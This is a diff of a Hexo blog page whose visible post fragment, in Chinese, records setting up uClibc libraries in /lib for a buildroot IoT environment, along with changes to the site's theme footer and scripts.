+<pre><code>sudo cp ld-uClibc-1.0.32.so /lib/
+sudo chown -R root:root /lib/ld-uClibc-1.0.31.so
+sudo ln -s /lib/ld-uClibc-1.0.32.so /lib/ld-uClibc.so.0
+</code></pre>
+<p>还是不行，cd /lib目录下，删掉了原来的ld-uClibc.so.0文件，然后重新输入命令。</p>
+<p>出现新报错：<code>/home/test/buildroot-2019.02.4/hello: can't load library 'libc.so.0'</code></p>
+<p>解决方案：</p>
+<pre><code>sudo cp libuClibc-1.0.31.so /lib/
+sudo chown -R root:root /lib/libuClibc-1.0.32.so
+sudo ln -s /lib/libuClibc-1.0.32.so /lib/libc.so.0
+</code></pre>
+<p>还是出现了文件不对应问题，cd /lib下删掉了原来的libc.so.0文件，继续重新输入命令。</p>
+<p>运行成功。</p>
+<p>os:为了找到出错点，我真是已经切换目录切换到全都背下来了……真的是一搭环境总会碰到所有的问题……霉霉本霉了。</p>
+<h1 id="0x04-配置网络环境"><a href="#0x04-配置网络环境" class="headerlink" title="0x04 配置网络环境"></a>0x04 配置网络环境</h1>
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/SinkyQ/SinkyQ.github.io.git/tags/IOT/" rel="tag">IOT</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
   
   
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/SinkyQ/SinkyQ.github.io.git/page/2/">&amp;laquo; Prev</a><a class="page-number" href="/SinkyQ/SinkyQ.github.io.git/">1</a><a class="page-number" href="/SinkyQ/SinkyQ.github.io.git/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/SinkyQ/SinkyQ.github.io.git/page/4/">4</a><a class="extend next" rel="next" href="/SinkyQ/SinkyQ.github.io.git/page/4/">Next &amp;raquo;</a>
+    </nav>
   
 </div>
-
-  </footer>
-
-  <!-- Scripts -->
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2022 Sinky
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/preccrep/hexo-theme-jelly" target="_blank">Jelly</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
   
-  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
-
-  <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
-    NProgress.start()
-    window.addEventListener('load', function() {
-      NProgress.done();
-    })
-  </script>
+<link rel="stylesheet" href="/SinkyQ/SinkyQ.github.io.git/fancybox/jquery.fancybox.css">
 
 
-<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
-<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/SinkyQ/SinkyQ.github.io.git/js/events.js" ></script>
-<script  src="/SinkyQ/SinkyQ.github.io.git/js/plugins.js" ></script>
 
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: false,
+		animate: true,
+		isHome: true,
+		isPost: false,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
 
-  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var subtitle = document.getElementById('subtitle');
-      if (!subtitle || !typing) {
-        return;
-      }
-      var text = subtitle.getAttribute('data-typed-text');
-      
-        typing(text);
-      
-    })(window, document);
-  </script>
+<script src="/SinkyQ/SinkyQ.github.io.git/js/main.js"></script>
 
 
 
 
-  
-    <script  src="/SinkyQ/SinkyQ.github.io.git/js/img-lazyload.js" ></script>
-  
-
-
-
-
-  <script  src="/SinkyQ/SinkyQ.github.io.git/js/local-search.js" ></script>
-
-
-
-
-
-<!-- 主题的启动项，将它保持在最底部 -->
-<!-- the boot of the theme, keep it at the bottom -->
-<script  src="/SinkyQ/SinkyQ.github.io.git/js/boot.js" ></script>
-
-
-  
-
-  <noscript>
-    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
-  </noscript>
+  </div>
 </body>
 </html>
